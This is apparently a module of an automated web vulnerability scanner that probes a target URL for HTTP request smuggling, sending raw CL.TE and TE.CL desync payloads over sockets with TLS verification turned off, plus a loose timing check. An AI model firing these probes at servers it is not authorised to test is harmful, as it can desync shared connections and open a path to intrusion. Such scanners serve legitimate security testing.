"""
APEX HTTP Request Smuggling Scanner
CL.TE, TE.CL, TE.TE desync detection
"""
import socket
import ssl
import time
import requests
from urllib.parse import urlparse


def scan_smuggling(target_url, discovered):
    """Scan for HTTP Request Smuggling vulnerabilities."""
    vulns = []
    parsed = urlparse(target_url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    use_ssl = parsed.scheme == 'https'

    smuggling_tests = [
        {
            'name': 'CL.TE',
            'description': 'Frontend uses Content-Length, backend uses Transfer-Encoding',
            'payload': (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 6\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"G"
            ),
            'indicator': 'Unrecognized method',
        },
        {
            'name': 'TE.CL',
            'description': 'Frontend uses Transfer-Encoding, backend uses Content-Length',
            'payload': (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"5c\r\n"
                f"GPOST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 15\r\n"
                f"\r\n"
                f"x=1\r\n"
                f"0\r\n"
                f"\r\n"
            ),
            'indicator': 'Unrecognized method',
        },
    ]

    for test in smuggling_tests:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)

            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))
            sock.send(test['payload'].encode())

            time.sleep(1)
            response = b''
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except:
                pass
            sock.close()

            resp_text = response.decode('utf-8', errors='ignore')
            if test['indicator'].lower() in resp_text.lower() or 'GPOST' in resp_text:
                vulns.append({
                    'type': 'smuggling', 'subtype': test['name'].lower().replace('.', '_'),
                    'endpoint': target_url,
                    'parameter': 'N/A',
                    'payload': test['name'],
                    'result': f'HTTP Request Smuggling ({test["name"]}) detected',
                    'confirmed': True, 'severity': 'critical',
                    'target': target_url,
                    'description': f'{test["description"]}. Request smuggling vulnerability found.'
                })
        except Exception as e:
            pass

    # Also try timing-based detection via requests
    try:
        sess = requests.Session()
        sess.verify = False
        # Send a request with conflicting headers
        headers = {
            'Content-Length': '0',
            'Transfer-Encoding': 'chunked',
        }
        r1 = sess.get(target_url, headers=headers, timeout=5)
        time.sleep(1)
        r2 = sess.get(target_url, timeout=5)

        # If timing differs significantly, might indicate desync
        if abs(r1.elapsed.total_seconds() - r2.elapsed.total_seconds()) > 2:
            vulns.append({
                'type': 'smuggling', 'subtype': 'timing_desync',
                'endpoint': target_url,
                'parameter': 'N/A',
                'payload': 'Conflicting CL/TE headers',
                'result': 'Potential request smuggling (timing desync)',
                'confirmed': False, 'severity': 'high',
                'target': target_url,
                'description': 'Timing difference detected with conflicting headers — possible desync.'
            })
    except:
        pass

    return vulns